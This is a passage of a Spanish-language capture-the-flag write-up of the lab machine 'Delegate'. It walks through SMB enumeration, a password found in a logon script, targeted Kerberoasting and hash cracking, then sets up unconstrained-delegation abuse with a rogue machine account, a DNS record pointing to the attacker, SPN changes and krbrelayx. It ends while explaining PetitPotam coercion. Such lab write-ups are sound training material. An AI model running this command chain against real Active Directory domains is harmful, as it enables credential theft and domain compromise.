Propiedades:
- OS: Windows
- Plataforma: HackTheBox / Vulnlab
- Nivel: Medium 
- Tags: #unconstrained-delegation #SeEnableDelegationPrivilege #smb #bloodhound #bloodyad #password-cracking #krbrelayx #impacket

![](assets/Pasted%20image%2020260210161247.png)
## Reconocimiento.

Comienzo con un ping para comprobar la conectividad.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~]
└──╼ [★]$ ping -c 1 10.129.234.69
PING 10.129.234.69 (10.129.234.69) 56(84) bytes of data.
64 bytes from 10.129.234.69: icmp_seq=1 ttl=127 time=9.35 ms

--- 10.129.234.69 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 9.354/9.354/9.354/0.000 ms

```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.234.69 -oG nmap/allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
50727/tcp open  unknown          syn-ack ttl 127
51100/tcp open  unknown          syn-ack ttl 127
51101/tcp open  unknown          syn-ack ttl 127
51106/tcp open  unknown          syn-ack ttl 127
57518/tcp open  unknown          syn-ack ttl 127
57870/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49670,50727,51100,51101,51106,57518,57870 -sV -sC -Pn -n -sS -vvv 10.129.234.69

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-04 23:39:13Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-04T23:40:09+00:00
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Issuer: commonName=DC1.delegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-03T23:31:12
| Not valid after:  2026-08-05T23:31:12
| MD5:   61f0:afe0:b11d:b48a:1b4e:b1d4:453e:70b8
| SHA-1: 4c1d:f514:52b6:9bfe:d5ec:deec:3ff0:b42f:a24f:db07
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQF8V9UH2tiZRGkLqztUveRzANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQzEuZGVsZWdhdGUudmwwHhcNMjYwMjAzMjMzMTEyWhcNMjYw
| ODA1MjMzMTEyWjAaMRgwFgYDVQQDEw9EQzEuZGVsZWdhdGUudmwwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDB/8qahPSVbxwxSKQvDyg6ehFG73mKjhmj
| 5YVZYZ7aVcVgurOPKsanC18KEWHOS0rNYnsswjYDFKPAyhfuZQQAtPiQdD4QWIgN
| EzDQPpN8u6tnuZP77Ysgsp1aE7fopifyjVMT9JWwGbI4fvZm+6sNUZTgdAs79UnI
| 7urczUr8qrDwp4y4PpAVhtkPQfUQiUuApnCaI3R8zW/enNzZSgEpE8qQPXszWEL1
| gLTUcdFX88QkE1eR30NL5bBmT4YjYS/K+NqS3Cc0+4rpMhaNGzV6d43aOTVkHTYY
| 02PvGEOWjI0Bm4d9k5A4NQDaRKo2ZSFVKxRhsRgbDtz46xiQcRt1AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAC1W8GqTBeBcjVOckZN1dZUWCewvvYUDcii3no5pOHPyKz/eO0eAxj/lj
| iLYOczEQWG4aXktxor6mUpmKbOFoZhULqMPCuMZH7xT6LhOKFmphUjdmEsoDFoPr
| daqwSdB79meIS/+qr+65KatBrzF+IhXs4cDkREEqBDU6E+D1EHuKMOG8fWORtUY1
| IR45fsrKmskCzKjU4aP/Gm677iQf6lGFh7RRCLKDjjYho53WzqUAdcO4zu4niSVl
| K1qPEagDPv00DvqtuxQuqGNxBcEyHZBjde/UkvTIzkCP8qqIPYt30a3N1rngC/sa
| HudM1n27QuozwgmDSLIBQv+40jkgNQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-04T23:40:49+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51100/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
51101/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51106/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57518/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57870/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-04T23:40:12
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30710/tcp): CLEAN (Timeout)
|   Check 2 (port 43192/tcp): CLEAN (Timeout)
|   Check 3 (port 57962/udp): CLEAN (Timeout)
|   Check 4 (port 45851/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

Por la informacion que tengo puedo intuir que estoy contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 389, 636 LDAP
- Puerto 5985 WinRm

## Enumeración.
### Puerto 445

Saque información general de la maquina:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ nxc smb 10.129.234.69 
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
```

- Dominio **delegate.vl** y nombre DC1.

Pude enumerar los recursos como el usuario guest, pero solo tengo permisos de lectura en recursos standar.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ nxc smb delegate.vl -u 'guest' -p '' --shares
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share 
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share 
```

Tambien puedo sacar los usuarios vía rid bruteforce:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ nxc smb delegate.vl -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
SMB                      10.129.234.69   445    DC1              500: DELEGATE\Administrator (SidTypeUser)
SMB                      10.129.234.69   445    DC1              501: DELEGATE\Guest (SidTypeUser)
SMB                      10.129.234.69   445    DC1              502: DELEGATE\krbtgt (SidTypeUser)
SMB                      10.129.234.69   445    DC1              1000: DELEGATE\DC1$ (SidTypeUser)
SMB                      10.129.234.69   445    DC1              1104: DELEGATE\A.Briggs (SidTypeUser)
SMB                      10.129.234.69   445    DC1              1105: DELEGATE\b.Brown (SidTypeUser)
SMB                      10.129.234.69   445    DC1              1106: DELEGATE\R.Cooper (SidTypeUser)
SMB                      10.129.234.69   445    DC1              1107: DELEGATE\J.Roberts (SidTypeUser)
SMB                      10.129.234.69   445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)

```

Al conectarme al recurso SYSVOL me encontre con un directorio /scripts que contenia un archivo llamado `usuarios.bat`:

```bash
smb: \delegate.vl\scripts\> ls
  .                                   D        0  Sat Aug 26 07:45:24 2023
  ..                                  D        0  Sat Aug 26 04:45:45 2023
  users.bat                           A      159  Sat Aug 26 07:54:29 2023

		4652287 blocks of size 4096. 1119590 blocks available
smb: \delegate.vl\scripts\> get users.bat
getting file \delegate.vl\scripts\users.bat of size 159 as users.bat (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
```

En este archivo me encontré unas credenciales para el usuario A.briggs:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ cat users.bat 
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123┌
```

## Acceso Inicial

Probe las credenciales para distintos servicios:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ nxc smb delegate.vl -u a.briggs -p 'P4ssw0rd1#123'
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123 
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ nxc winrm delegate.vl -u a.briggs -p 'P4ssw0rd1#123'
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\a.briggs:P4ssw0rd1#123
```

- La credencial es valida para SMB Y LDAP pero no para WinRm.

Ahora que tengo credenciales puedo hacer uso de **bloodhound**.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

El primer paso es utilizar un **Ingestor** que se va a encargar de recopilar toda la información del dominio. En este caso utilice `bloodhound-python`.

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist/content]
└──╼ [★]$ bloodhound-python -c All -u a.briggs -p 'P4ssw0rd1#123' -d delegate.vl -ns 10.129.234.69 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: delegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC1.delegate.vl
INFO: Done in 00M 02S
INFO: Compressing output into 20260204181044_bloodhound.zip
```

### GenericWrite sobre n.thompson.

Al importar la información a BloodHound puedo ver lo siguiente:

- a.briggs tiene el permiso GenericWrite sobre n.thompson

![](assets/image.png)

El permiso **GenericWrite** sobre un usuario en Active Directory permite modificar ciertos atributos sensibles del objeto, entre ellos `servicePrincipalName`.

Una forma de abusar de este permiso es mediante un ataque conocido como **Targeted Kerberoasting**, el cual consiste en **asignar un SPN controlado a un usuario que no lo tenía previamente**.

Una vez establecido el SPN, es posible solicitar un **Ticket Granting Service (TGS)** para dicho servicio, obteniendo un **hash Kerberos crackeable offline**. 

Para este ataque utilice la herramienta [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb]
└──╼ [★]$ python3 targetedKerberoast.py -v -d delegate.vl -u a.briggs -p 'P4ssw0rd1#123'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$52924e692d75a401043f1f2858306dff$c2e2c4ea6614332f30cbf8bab620225fa4dc382fc58ee673369951da3e2da882588550eccf1570a28a946eaefbdd94021474071349f67610ae825c42c623b0c5ef8b2704d25ca81d02e501e93ad82c8d2da9e2205152eb67ed52c564ee0c4e882bbf6e3da5854c3764a26103dc13c843fd444fb761bb8167681c24fa60bf07a843c04620bbf75eb477852e18bc4e39897234b4f25e48b322a94f073a13f76dc21845f039aa27a7dd80d1782e73255e9176168d05bcb30bcf6f992690cb701a29e88e01ac2f524d5deeb776a229561045b5b34e70b54757a85c4bd0581c2677570881e9fd6ca0f73fb598fd9fc9660074468e6529a9c0307fb5be4e4e0adee094f5af0b40fb70828047a0f4c06810b9bc46f961742e7385092151bda6c565ee6446ad584c440da4bcd969c4ca3bcd82f05532fda353e3af3c02575cda97336f741fdf80eb99bd280d859b7478915cb4a649e80de820588bcd1c187bc1c324fd8c3849264bbfba9d545dfe4077e8e48376211c8bfce0d91a472969e0757c0b0c8489730c1cd02c820ddc3d71540131deb7aa5f55aad94f7eb9fab58dfc4a6ceaa8147fbf9210cce995402670a1be2578a950ff154319d8726fd7f1f13d3289e033a702b1a8735559568b39140eeb84eb30ea2038e7e06651371c0a3cedc7b69345c45b96ccef27769579fa85dc24b00ae3dae5a9058b63aabca0229abbf2370a0e32fea1c4089649b57dbca79e15386ac8e06f90848f2733c269e6682fc8a95e3ce3097e773efe1606dff9e1095ca4c464b58471efee412b5c744a472972d04f4ff7c5351bf7bafe9fbfe071e791b045616e4eb3c26d7d70081904b78e5f3e3da07d641fb2f561da8fb6ddebfe004d7dda2dc4012f86c590d372834fce529c86db8886b4e448c1fb53a8fb9a279cc2e68dd04b8e2c3ba4389bbcf5b7e6e682797d782a6e6ea813398c398c7968c32bfd3d07aaa51d04875c00a16c0a58acc415c7b1da2d51279f1e62fd32cd6dc10eb3c34d0db3c8ddc229fd1e1b9abcf3fdf39a39db070d1c81cdbad6969e5584fd532e3716375631517d92914883d88e2d5ecfe4080cc32b117308c4924b52f5ba9abe40daa276c7f00cb8c823e99d4b7f00bbc4dfdb0100cb5be74613f4945d15726a290edbca6fb18f0f09399452f7ab189e7599e6c1cb44f0b3b6ecfde8b2911b9bd8a982029591fd3fec42cf0c02cc4ce7e4a5f603a51894ef5338401580642fcfff18a2ee69169ef746e61d860c88162d1e5985b7b3bc92caef92562a29abea7dc30fab92c9b95a623ceb8aeea19343c7bfdc35c783aac409373fdc9d80b7a80978189c26806658a4f51a651b4f48ce88635b96965d4a7e004997a7a2a6bf785b773fd19b7e29028f6fdda1ee66bf119883381d9f1f425318051856b64a839011615c92393733c681a187e63c9e4d59f82a871b34
[VERBOSE] SPN removed successfully for (N.Thompson)

```

Este hash lo puedo crackear usando `hashcat`:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ sudo hashcat hash.txt rockyou.txt 

$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$52924e692d75a401043f1f2858306dff$c2e2c4ea6614332f30cbf8bab620225fa4dc382fc58ee673369951da3e2da882588550eccf1570a28a946eaefbdd94021474071349f67610ae825c42c623b0c5ef8b2704d25ca81d02e501e93ad82c8d2da9e2205152eb67ed52c564ee0c4e882bbf6e3da5854c3764a26103dc13c843fd444fb761bb8167681c24fa60bf07a843c04620bbf75eb477852e18bc4e39897234b4f25e48b322a94f073a13f76dc21845f039aa27a7dd80d1782e73255e9176168d05bcb30bcf6f992690cb701a29e88e01ac2f524d5deeb776a229561045b5b34e70b54757a85c4bd0581c2677570881e9fd6ca0f73fb598fd9fc9660074468e6529a9c0307fb5be4e4e0adee094f5af0b40fb70828047a0f4c06810b9bc46f961742e7385092151bda6c565ee6446ad584c440da4bcd969c4ca3bcd82f05532fda353e3af3c02575cda97336f741fdf80eb99bd280d859b7478915cb4a649e80de820588bcd1c187bc1c324fd8c3849264bbfba9d545dfe4077e8e48376211c8bfce0d91a472969e0757c0b0c8489730c1cd02c820ddc3d71540131deb7aa5f55aad94f7eb9fab58dfc4a6ceaa8147fbf9210cce995402670a1be2578a950ff154319d8726fd7f1f13d3289e033a702b1a8735559568b39140eeb84eb30ea2038e7e06651371c0a3cedc7b69345c45b96ccef27769579fa85dc24b00ae3dae5a9058b63aabca0229abbf2370a0e32fea1c4089649b57dbca79e15386ac8e06f90848f2733c269e6682fc8a95e3ce3097e773efe1606dff9e1095ca4c464b58471efee412b5c744a472972d04f4ff7c5351bf7bafe9fbfe071e791b045616e4eb3c26d7d70081904b78e5f3e3da07d641fb2f561da8fb6ddebfe004d7dda2dc4012f86c590d372834fce529c86db8886b4e448c1fb53a8fb9a279cc2e68dd04b8e2c3ba4389bbcf5b7e6e682797d782a6e6ea813398c398c7968c32bfd3d07aaa51d04875c00a16c0a58acc415c7b1da2d51279f1e62fd32cd6dc10eb3c34d0db3c8ddc229fd1e1b9abcf3fdf39a39db070d1c81cdbad6969e5584fd532e3716375631517d92914883d88e2d5ecfe4080cc32b117308c4924b52f5ba9abe40daa276c7f00cb8c823e99d4b7f00bbc4dfdb0100cb5be74613f4945d15726a290edbca6fb18f0f09399452f7ab189e7599e6c1cb44f0b3b6ecfde8b2911b9bd8a982029591fd3fec42cf0c02cc4ce7e4a5f603a51894ef5338401580642fcfff18a2ee69169ef746e61d860c88162d1e5985b7b3bc92caef92562a29abea7dc30fab92c9b95a623ceb8aeea19343c7bfdc35c783aac409373fdc9d80b7a80978189c26806658a4f51a651b4f48ce88635b96965d4a7e004997a7a2a6bf785b773fd19b7e29028f6fdda1ee66bf119883381d9f1f425318051856b64a839011615c92393733c681a187e63c9e4d59f82a871b34:

:KALEB_2341

```

- KALEB_2341 es la contraseña para el usuario n.thompson.

Este usuario forma parte del grupo Remote Managment Users por lo cual puedo conectarme vía WinRm:

```bash
┌─[us-dedivip-2]─[10.10.15.2]─[wonderiing@htb-gretkpeiib]─[~/Machines/heist]
└──╼ [★]$ evil-winrm -i 10.129.234.69 -u n.thompson -p KALEB_2341
                                        

*Evil-WinRM* PS C:\Users\N.Thompson> whoami
delegate\n.thompson
*Evil-WinRM* PS C:\Users\N.Thompson> cd Desktop
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> type user.txt
c5bb751d916bacdb11f917e48f1c2f00

```

## Escalada de Privilegios.

En tema de privilegios tengo los siguientes:

```powershell
evil-winrm-py PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

- Destaca SeEnableDelegationPrivilege

Y en tema de grupos tengo los siguientes:

```powershell
evil-winrm-py PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
DELEGATE\delegation admins                  Group            S-1-5-21-1484473093-3449528695-2030935120-1121 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
```

- Destaca delegation admins.

### Abusando de Unconstrained Delegation

!!! info
    En Kerberos, cuando un servicio tiene Unconstrained Delegation habilitado,
cualquier cliente que se autentique contra él enviará **su TGT completo**, 
no solo un Service Ticket.  
>Esto permite al servicio reutilizar ese TGT para autenticarse como el cliente
contra cualquier otro servicio del dominio.
>El privilegio SeEnableDelegationPrivilege permite **habilitar unconstrained delegation** en cuentas de equipo o cuentas de servicio

Primero necesito saber si soy capaz de crear maquina, esto lo puedo ver usando `netexec` y el modulo maq:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/delegate]
└─$ nxc ldap delegate.vl -u n.thompson -p KALEB_2341 -M maq
LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.129.234.69   389    DC1              [+] delegate.vl\n.thompson:KALEB_2341
MAQ         10.129.234.69   389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
```

- MachineAccountQuota me indica que puedo agregar hasta 10 maquinas al dominio.

Voy a agregar una cuenta maquina para tener control a ella:

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ impacket-addcomputer delegate.vl/n.thompson:'KALEB_2341' -computer-name w0ndr -computer-pass "w0nder11ng" -dc-ip 10.129.234.69
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account w0ndr$ with password w0nder11ng.
```

Ahora tengo que agregar el atributo `TRUSTED_FOR_DELEGATION` para habilitar el Unconstrained Delegations en la cuenta maquina: 

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'w0ndr$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to w0ndr$'s userAccountControl
```

Ahora que la cuenta maquina ya tiene habilitado Unconstrained Delegations, necesitamos una forma de que el `DC` se autentique contra algun servicio controlador por la cuenta maquina para nosotros obtener el TGT de la cuenta maquina.

Para que el DC se autentique vía Kerberos contra nuestro servidor falso,
deben cumplirse dos condiciones:

1. Agregar un registro DNS que resuelva a nuestra ip
2. La cuenta maquina debe de tener un SPN asociado.

Si cualquiera de los dos falta, Kerberos no emitirá tickets.

Primero agregaremos el registro DNS:

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ python3 dnstool.py -u 'delegate.vl\w0ndr$' -p 'w0nder11ng' -r 'w0ndr.delegate.vl' -d 10.10.16.57 --action add DC1.delegate.vl -dns-ip 10.129.234.69
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Después tenemos que asociar un SPN a la cuenta maquina:

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ python3 addspn.py -u delegate\\N.THOMPSON -p 'KALEB_2341' -s HOST/w0ndr.delegate.vl dc1.delegate.vl -t 'w0ndr$' -dc-ip 10.129.234.69 --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully

┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ python3 addspn.py -u 'delegate\N.THOMPSON' -p 'KALEB_2341' -s 'host/w0ndr.delegate.vl' -t 'w0ndr$' -dc-ip 10.129.234.69 dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Podemos confirmar el registro DNS se añadió de manera correcta usando `nslookup`.

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ nslookup w0ndr.delegate.vl 10.129.234.69
Server:         10.129.234.69
Address:        10.129.234.69#53

Name:   w0ndr.delegate.vl
Address: 10.10.16.57
```

Ahora tenemos que encontrar una manera de forzar que la maquina se autentique a nuestro servidor.

Primero necesitamos una forma de  capturar la autenticación en mi caso voy a utilizar `krbrelayx`.

- krbrelayx necesita del hash NTLM de contraseña

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ iconv -f ASCII -t UTF-16LE <(printf 'w0nder11ng') | openssl dgst -md4
MD4(stdin)= 56ade972b15b9bc68ada27ef0729c37c
```

Ahora podemos levantar `krbrelayx` para que se haga pasar como el servicio asociado de la cuenta maquina `w0ndr$` y capturar la autenticación:

```bash
┌──(wndr㉿wndr)-[~/Tools/krbrelayx]
└─$ python3 krbrelayx.py -hashes :56ade972b15b9bc68ada27ef0729c37c --interface-ip 10.10.16.57
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server

[*] Servers started, waiting for connections
[*] Setting up DNS Server
[*] Setting up HTTP Server on port 80
```

El segundo paso consiste en encontrar una forma de forzar la autenticación, esto lo podemos ver con `netexec` y el modulo `coerce_plus`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/delegate]
└─$ netexec smb dc1.delegate.vl -u 'w0ndr$' -p 'w0nder11ng' -M coerce_plus
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\w0ndr$:w0nder11ng
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PetitPotam
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, MSEven
```

- Hay distintos metodos pero yo voy a usar PetitPotam.

!!! info
    **PetitPotam** es una técnica de "coerción de autenticación" que **fuerza a una máquina Windows a autenticarse contra un servidor que TÚ eliges**.
    Petit Potam se aprovecha de la función `EfsRpcAddUsersToFile` que añade usuarios a archivos cifrados. Esta función es parte de `Encrypting File System` (EFS), una característica de windows que permite cifrar archivos y carpetas.

